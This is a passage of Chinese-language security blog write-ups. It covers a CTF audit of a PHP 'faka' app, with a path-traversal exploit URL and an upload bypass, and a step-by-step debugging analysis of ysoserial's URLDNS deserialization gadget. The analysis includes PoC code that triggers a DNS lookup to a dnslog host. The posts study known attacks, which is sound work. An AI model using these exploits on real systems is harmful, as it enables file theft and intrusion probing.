<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130153259922.png" alt="image-20201130153259922"></p>
<h2 id="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"><a href="#&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;" class="headerlink" title="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"></a>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</h2><p><code>application/manage/controller/Backup.php</code>#downloadBak </p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130153740566.png" alt="image-20201130153740566"></p>
<p>finename&#x53EF;&#x63A7;&#xFF0C;&#x76EE;&#x5F55;&#x7A7F;&#x8D8A; </p>
<p>Exp:</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://wdb-vul/index.php/manage/backup/downloadBak?file=../../../../../../../../../Users/p2hm1n/Desktop/flag</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;"><a href="#&#x6587;&#x4EF6;&#x4E0A;&#x4F20;" class="headerlink" title="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;"></a>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;</h2><p>&#x53D1;&#x73B0;&#x5148;&#x77E5;&#x5DF2;&#x7ECF;&#x6709;&#x5E08;&#x5085;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x6F0F;&#x6D1E;&#x70B9;&#x4E86; <a href="https://xz.aliyun.com/t/7838" target="_blank" rel="noopener">https://xz.aliyun.com/t/7838</a></p>
<p>&#x8DDF;&#x7740;&#x590D;&#x73B0;&#x5206;&#x6790;&#x4E00;&#x6CE2;&#x3002;</p>
<p><code>application/admin/controller/Plugs.php</code> &#x4E3B;&#x8981;&#x662F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x4E00;&#x4E9B;&#x6821;&#x9A8C;&#x3002;</p>
<p>&#x4E0A;&#x4F20;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5148;&#x8C03;&#x7528; <code>upstate</code>&#xFF0C;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x5982;&#x4E0B;&#xFF1A;</p>
<ol>
<li>&#x5C06;&#x901A;&#x8FC7; POST &#x4F20;&#x5165;&#x7684; md5 &#x503C;&#x4EE5;16&#x4F4D;&#x5B57;&#x6BCD;&#x4E3A;&#x95F4;&#x9694;&#x8FDB;&#x884C;&#x5206;&#x5272;&#xFF0C;&#x5E76;&#x62FC;&#x63A5;&#x4F20;&#x5165;filename &#x7684;&#x540E;&#x7F00;</li>
<li>&#x68C0;&#x6D4B;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E0A;&#x4F20;</li>
<li>&#x751F;&#x6210; config &#x6570;&#x7EC4;&#xFF0C;&#x5E76;&#x6DFB;&#x52A0;&#x6BCF;&#x4E00;&#x4E2A;&#x952E;&#x7684;&#x503C;</li>
</ol>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130193500442.png" alt="image-20201130193500442"></p>
<p>&#x4E4B;&#x540E;&#x8C03;&#x7528; <code>upload</code> &#xFF0C;&#x8FD9;&#x91CC;&#x770B;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5904;&#x7406;&#x7684;&#x4F4D;&#x7F6E;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130212324561.png" alt="image-20201130212324561"></p>
<p>&#x8DDF;&#x8FDB; <code>move</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130212827808.png" alt="image-20201130212827808"></p>
<p>&#x8DDF;&#x8FDB; <code>buildSaveName</code> </p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130212940148.png" alt="image-20201130212940148"></p>
<p>final POC</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192319757.png" alt="image-20201130192319757"></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192330685.png" alt="image-20201130192330685"></p>
<p>&#x4E0A;&#x4F20;&#x81F3; static &#x76EE;&#x5F55;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192305239.png" alt="image-20201130192305239"></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192722214.png" alt="image-20201130192722214"></p>
</body></html>]]></content>
      <categories>
        <category>PHP Sec</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial URLDNS 调试分析</title>
    <url>/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x4EE5; URLDNS &#x4F5C;&#x4E3A; ysoserial &#x8C03;&#x8BD5;&#x5206;&#x6790;&#x7684;&#x5F00;&#x7AEF;&#xFF0C;&#x8C03;&#x8BD5;&#x73AF;&#x5883; JDK 1.8 </p>
<a id="more"></a>



<h1 id="About-URLDNS"><a href="#About-URLDNS" class="headerlink" title="About URLDNS"></a>About URLDNS</h1><p>URLDNS &#x9002;&#x7528;&#x73AF;&#x5883;&#xFF1A;</p>
<ul>
<li><p>&#x4E0D;&#x4F9D;&#x8D56;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;</p>
</li>
<li><p>&#x5BF9;&#x65E0;&#x56DE;&#x663E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x901A;&#x8FC7; DNS &#x8BF7;&#x6C42;&#x9A8C;&#x8BC1;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
</li>
</ul>
<p>&#x6267;&#x884C;&#x6548;&#x679C;&#xFF1A;</p>
<p>&#x4E0D;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x53EA;&#x53D1;&#x8D77;&#x4E00;&#x6B21; DNS &#x8BF7;&#x6C42;</p>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220004120328.png" alt="image-20201220004120328"></p>
<p>&#x5927;&#x81F4;&#x6D4F;&#x89C8;&#x5176;&#x529F;&#x80FD;&#x540E;&#x5F52;&#x7EB3;&#x51FA;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;</p>
<ol>
<li>URLDNS &#x662F;&#x600E;&#x4E48;&#x53D1;&#x8D77; DNS &#x8BF7;&#x6C42;&#x7684;</li>
<li>&#x4E3A;&#x4EC0;&#x4E48;&#x80FD;&#x5728;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x70B9;&#x53D1;&#x8D77;&#x653B;&#x51FB;&#xFF0C;ysoserial &#x662F;&#x600E;&#x4E48;&#x505A;&#x7684;</li>
<li>&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x548C;&#x4E4B;&#x524D;&#x5B66;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x91CD;&#x5199; readObject &#x6709;&#x4EC0;&#x4E48;&#x533A;&#x522B;</li>
</ol>
<p>&#x4E0B;&#x9762;&#x8FDB;&#x5165;&#x5206;&#x6790;&#x6D41;&#x7A0B;</p>
<h1 id="URLDNS-POC-Analyse"><a href="#URLDNS-POC-Analyse" class="headerlink" title="URLDNS POC Analyse"></a>URLDNS POC Analyse</h1><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>ysoserial &#x7ED9;&#x7684;&#x5229;&#x7528;&#x94FE;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>ysoserial Code&#xFF1A;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>{</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">                URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();</span><br><span class="line">                HashMap ht = <span class="hljs-keyword">new</span> HashMap(); </span><br><span class="line">                URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler);</span><br><span class="line">                ht.put(u, url); </span><br><span class="line">                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); </span><br><span class="line">                <span class="hljs-keyword">return</span> ht;</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7531;&#x4E8E; ysoserial &#x9664;&#x4E86;&#x6838;&#x5FC3;&#x5229;&#x7528;&#x4EE3;&#x7801;&#x4E4B;&#x5916;&#x6D89;&#x53CA;&#x5F88;&#x591A; ysoserial &#x5DE5;&#x5177;&#x672C;&#x8EAB;&#x7684;&#x4E1C;&#x897F;&#x3002;&#x56E0;&#x6B64;&#x628A;&#x4EE3;&#x7801;&#x6263;&#x51FA;&#x6765;&#x8C03;&#x8BD5;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x5F15;&#x7528; @&#x5566;&#x5566;0&#x54AF;&#x54AF; &#x5E08;&#x5085;&#x6587;&#x4E2D;&#x4EE3;&#x7801;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="hljs-keyword">import</span> java.net.URL;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-comment">// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x952E;&#x7684;&#x7C7B;&#x578B;&#x4E3A; URL&#xFF0C; &#x503C;&#x7684;&#x7C7B;&#x578B;&#x4E3A; String &#x7684; hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="hljs-comment">// &#x4E0A;&#x9762;&#x6CDB;&#x578B;&#x89C4;&#x5B9A;&#x4E86;&#x952E;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; URL &#x7C7B;</span></span><br><span class="line">        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://3n5nmt.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="hljs-comment">// hashCode&#x662F;private&#x4FEE;&#x9970;&#xFF0C;&#x56E0;&#x6B64;&#x53CD;&#x5C04;&#x8C03;&#x7528; URL &#x7C7B;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;</span></span><br><span class="line">        Field f = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="hljs-comment">// &#x4FEE;&#x6539;&#x6743;&#x9650;</span></span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        <span class="hljs-comment">// 0xdeadbeef &#x968F;&#x4FBF;&#x8BBE;&#x7F6E;</span></span><br><span class="line">        f.set(url, <span class="hljs-number">0xdeadbeef</span>);</span><br><span class="line">        <span class="hljs-comment">// URLDNS &#x968F;&#x4FBF;&#x8BBE;&#x7F6E;</span></span><br><span class="line">        hashMap.put(url, <span class="hljs-string">&quot;URLDNS&quot;</span>);</span><br><span class="line">        f.set(url, -<span class="hljs-number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Analyse-DNS"><a href="#Analyse-DNS" class="headerlink" title="Analyse -DNS"></a>Analyse -DNS</h2><p>&#x9996;&#x5148;&#x56DE;&#x987E;&#x8FD9;&#x4E2A; POC &#x7684;&#x529F;&#x80FD; &#x2014;&#x2014; &#x53D1;&#x8D77; DNS &#x8BF7;&#x6C42;</p>
<p>&#x90A3;&#x4E48;&#x7EB5;&#x89C2;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x7684;&#x662F;&#x9664;&#x4E86; <code>ois.readObject();</code> &#x4E4B;&#x5916;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p>
<p>&#x601D;&#x8003;&#x4E00;&#x4E0B; Java &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x6838;&#x5FC3;&#x6211;&#x4EEC;&#x4E0D;&#x96BE;&#x5F97;&#x77E5;&#xFF0C;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E00;&#x5B9A;&#x91CD;&#x5199;&#x4E86; <code>readObject</code>&#x3002;&#x90A3;&#x4E48;&#x5411;&#x4E0A;&#x8FFD;&#x6EAF;&#x662F;&#x54EA;&#x91CC;&#x91CD;&#x5199;&#x4E86;  <code>readObject</code> &#x5462;&#xFF1F;</p>
<p><code>java.util.HashMap#readObject</code>  &#x4E2D; <code>putVal(hash(key), key, value, false, false);</code> </p>
<ul>
<li>&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x5173;&#x6CE8; <code>(hash(key)</code></li>
</ul>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220190534777.png" alt="image-20201220190534777"></p>
<p><code>java.util.HashMap#hash</code></p>
<ul>
<li>&#x64CD;&#x4F5C;&#x610F;&#x4E49;&#x5177;&#x4F53;&#x770B;&#xFF1A;<a href="https://www.zhihu.com/question/20733617" target="_blank" rel="noopener">https://www.zhihu.com/question/20733617</a></li>
<li>&#x4E3B;&#x8981;&#x8DDF;&#x8FDB; <code>key.hashCode()</code></li>
</ul>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221530254.png" alt="image-20201220221530254"></p>
<p><code>java.net.URL#hashCode</code></p>
<ul>
<li>&#x8FD9;&#x91CC;&#x5BF9; <code>hashCode</code> &#x6709;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x8981;&#x4E3A; -1 &#x624D;&#x80FD;&#x53BB;&#x89E6;&#x53D1;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;</li>
<li>&#x540E;&#x7EED;&#x8FDB;&#x5165; <code>handler.hashCode()</code>, <code>handler</code> &#x6765;&#x6E90;&#x4E8E;  <code>transient URLStreamHandler handler;</code> </li>
</ul>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221646405.png" alt="image-20201220221646405"></p>
<p><code>java.net.URLStreamHandler#hashCode</code></p>
<ul>
<li>&#x8FD9;&#x91CC;&#x89E6;&#x53D1;&#x5173;&#x952E;&#x7684;&#x65B9;&#x6CD5; <code>getHostAddress</code></li>
</ul>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221745111.png" alt="image-20201220221745111"></p>
<p><code>java.net.URLStreamHandler#getHostAddress</code></p>
<ul>
<li>&#x8FD9;&#x2FA5; <code>InetAddress.getByName(host)</code> &#x7684;&#x4F5C;&#x2F64;&#x662F;&#x6839;&#x636E;&#x4E3B;&#x673A;&#x540D;&#xFF0C;&#x83B7;&#x53D6;&#x5176;IP&#x5730;&#x5740;&#x3002;&#x6240;&#x4EE5;&#x53D8;&#x76F8;&#x7B49;&#x4E8E;&#x4E86;DNS&#x67E5;&#x8BE2;</li>
</ul>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220222049798.png" alt="image-20201220222049798"></p>
<p>&#x540E;&#x9762;&#x4E3A;&#x66F4;&#x6DF1;&#x7684;&#x8C03;&#x7528;&#x6808;</p>
<h2 id="Analyse-hashcode"><a href="#Analyse-hashcode" class="headerlink" title="Analyse - hashcode"></a>Analyse - hashcode</h2><p>&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x5206;&#x6790; POC &#x8FD9;&#x6BB5;&#x4EE3;&#x7801;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">f.set(url, <span class="hljs-number">0xdeadbeef</span>);</span><br><span class="line">hashMap.put(url, <span class="hljs-string">&quot;URLDNS&quot;</span>);</span><br><span class="line">f.set(url, -<span class="hljs-number">1</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x662F;&#x4E00;&#x4E2A; <code>hashCode</code> &#x5728;&#x4E0D;&#x540C;&#x573A;&#x666F;&#x4E0B;&#x503C;&#x7684;&#x95EE;&#x9898;</p>
<p>&#x63A7;&#x5236;&#x53D8;&#x91CF;&#x6CD5;&#xFF1A;&#x5148;&#x628A; <code>f.set(url, 0xdeadbeef);</code> &#x5220;&#x9664;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">// URLDNS POC</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> </span>{</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line">        hashMap.put(url, <span class="hljs-string">&quot;URLDNS&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">** java.util.HashMap#put</span></span><br><span class="line"><span class="hljs-comment">** &#x8FD9;&#x91CC;&#x5173;&#x6CE8;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">** java.util.HashMap#hash</span></span><br><span class="line"><span class="hljs-comment">** &#x8FD9;&#x91CC;&#x5173;&#x6CE8;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;</span></span><br><span class="line"><span class="hljs-comment">** &#x53EF;&#x89C1;&#x5230;&#x4E86;&#x4E4B;&#x524D;&#x5206;&#x6790;&#x89E6;&#x53D1; DNS &#x7684;&#x4EE3;&#x7801;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> h;</span><br><span class="line">    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">** java.util.HashMap#hash</span></span><br><span class="line"><span class="hljs-comment">** &#x8FD9;&#x91CC; hashCode &#x4E3A; -1&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x540E;&#x7EED;&#x7684;&#x8C03;&#x7528;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="hljs-keyword">this</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> hashCode;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">** java.net.URLStreamHandler#hashCode</span></span><br><span class="line"><span class="hljs-comment">** &#x8FD9;&#x91CC; hashCode &#x4E3A; -1&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x540E;&#x7EED;&#x7684;&#x8C03;&#x7528;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">(URL u)</span> </span>{</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line">    <span class="hljs-comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">** java.net.URLStreamHandler#getHostAddress</span></span><br><span class="line"><span class="hljs-comment">** &#x8FD9;&#x91CC;&#x89E6;&#x53D1; DNS &#x8BF7;&#x6C42; &#xFF01; &#x4F46;&#x6CE8;&#x610F;&#xFF01;&#xFF01;&#xFF01; &#x8FD9;&#x91CC;&#x4EC5;&#x4EC5;&#x662F;&#x5728;&#x6784;&#x9020;&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;&#x7684; DNS &#x8BF7;&#x6C42;</span></span><br><span class="line"><span class="hljs-comment">** &#x5E76;&#x975E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#x89E6;&#x53D1;&#xFF01;&#x5E76;&#x975E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#x89E6;&#x53D1;&#xFF01;&#x5E76;&#x975E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#x89E6;&#x53D1;&#xFF01;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>{</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7ECF;&#x8FC7;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x6790;&#x6211;&#x4EEC;&#x77E5;&#x9053; <code>f.set(url, 0xdeadbeef);</code> &#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x907F;&#x514D;&#x5728;&#x751F;&#x6210; POC &#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;&#x989D;&#x5916;&#x7684; DNS &#x8BF7;&#x6C42;&#xFF0C;&#x5F71;&#x54CD;&#x6211;&#x4EEC;&#x5BF9;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;&#x7684;&#x5224;&#x65AD;</p>
<p>&#x4EE5;&#x6211;&#x521A;&#x521A;&#x7684;&#x4F8B;&#x5B50;&#x4E3A;&#x4F8B;&#xFF0C;&#x5148;&#x770B;&#x4E00;&#x4E0B;&#x6B64;&#x65F6;&#x7684; hashCode</p>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201225170639641.png" alt="image-20201225170639641"></p>
<p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x521A;&#x521A;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x63A7;&#x5236;&#x53D8;&#x91CF;&#x6CD5;&#xFF1A;&#x628A; <code>f.set(url, -1);</code> &#x5220;&#x9664;</p>
<p>&#x76F4;&#x63A5;&#x8DF3;&#x5230;&#x5173;&#x952E;&#x5730;&#x65B9;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x91CC;&#x5E76;&#x4E0D;&#x4E3A; <code>-1</code> &#x56E0;&#x6B64;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165;&#x540E;&#x7EED;&#x89E6;&#x53D1; DNS &#x8BF7;&#x6C42;&#x7684;&#x8BED;&#x53E5;</p>
<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201225170954916.png" alt="image-20201225170954916"></p>
<p>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5F97;&#x51FA;&#x7ED3;&#x8BBA;&#xFF1A;<code>f.set(url, -1);</code> &#x7684;&#x5173;&#x952E;&#x4F5C;&#x7528;&#x662F;&#x63A7;&#x5236; <code>hashCode</code> &#x4E3A; <code>-1</code> &#xFF0C;&#x4ECE;&#x800C;&#x89E6;&#x53D1;&#x540E;&#x7EED; DNS &#x8BF7;&#x6C42;</p>
<h2 id="Analyse-ysoserial-POC"><a href="#Analyse-ysoserial-POC" class="headerlink" title="Analyse - ysoserial POC"></a>Analyse - ysoserial POC</h2><p>ysoserial &#x4E2D;&#x76F8;&#x6BD4;&#x4E8E;&#x4E4B;&#x524D;&#x5355;&#x7EAF;&#x7684; POC&#xFF0C;&#x5229;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x72EC;&#x7279;&#x7684;&#x5BF9;&#x8C61;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8DDF;&#x8FDB; <code>ysoserial.payloads.URLDNS.SilentURLStreamHandler</code></p>
